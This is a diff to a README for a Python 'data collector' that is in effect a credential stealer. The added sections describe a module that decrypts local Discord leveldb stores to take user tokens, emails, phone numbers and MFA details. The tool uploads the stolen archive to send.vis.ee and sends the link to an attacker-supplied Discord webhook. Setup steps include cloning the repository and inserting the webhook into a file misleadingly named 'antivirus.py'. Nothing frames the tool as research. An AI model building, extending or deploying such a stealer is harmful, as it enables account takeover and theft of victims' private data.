@@ -30,11 +30,22 @@ A Python-based system information collection tool that gathers various data abou
 - Uses pattern matching for executable detection
 - Generates detailed scan reports
 
-### 4. Main Launcher (`launch.pyw`)
+### 4. Discord Grabber (`utils/discord.py`)
+- Scans for any local discord leveldb
+- Decrypt the leveldb
+- Gets the UserID, Username, Mail, Number, Nitro information, Subscriptions, MFA information, TOKEN
+
+### 5. Send vis Uploader (`utils/visee.py`)
+- Upload the file safely to "https://send.vis.ee"
+- Handle error situations
+
+### 6. Main Launcher (`launch.pyw`)
 - Coordinates all collection processes
 - Runs with administrative privileges
 - Implements threading for parallel execution
 - Secures collected data in encrypted archives
+- Send the file to "https://send.vis.ee" using (`utils/visee.py`)
+- Send the installation URL to discord webhook encoded
 
 ## Requirements
 
@@ -48,6 +59,9 @@ A Python-based system information collection tool that gathers various data abou
 ## Installation
 
 1. Clone the repository
+```bash
+git clone https://github.com/Lunixizm0/Data-Collector.git
+```
 2. Install required Python packages:
 ```bash
 pip install playwright py7zr
@@ -56,6 +70,7 @@ pip install playwright py7zr
 ```bash
 python -m playwright install chromium
 ```
+4. Enter your discord webhook to (`utils/antivirus.py`) line 292
 
 ## Usage
 
@@ -69,6 +84,8 @@ The script will:
 2. Launch all data collection processes in parallel
 3. Store results in the temporary directory
 4. Create an encrypted archive of all collected data
+5. Post it to "https://send.vis.ee"
+6. Send the URL to discord webhook encoded
 
 ## Output Location
 
